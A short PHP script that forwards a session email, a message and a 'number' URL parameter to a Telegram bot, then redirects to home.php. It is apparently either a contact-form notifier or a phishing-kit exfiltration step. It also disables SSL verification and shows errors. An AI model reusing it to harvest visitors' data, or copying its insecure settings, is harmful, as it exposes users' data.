<?php
session_start();

error_reporting(E_ALL);
ini_set('display_errors', 1);
require_once("config_bot.php");
$botToken = $BOT_TOKEN; // Make sure this is FULL token
$chatId = $CHAT_ID;
// Prepare the request
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => "✅ Bot is working!\n".$_SESSION["email"]."\n\n--------------\n\n".$_SESSION["message"]."\n\n--------------\n\n".$_GET["number"]
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // For local dev
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_VERBOSE, true); // Enable verbose output

$verbose = fopen('php://temp', 'w+');
curl_setopt($ch, CURLOPT_STDERR, $verbose);

$result = curl_exec($ch);


            $_SESSION["sent"] = false;
            header("Location: home.php");
            ?>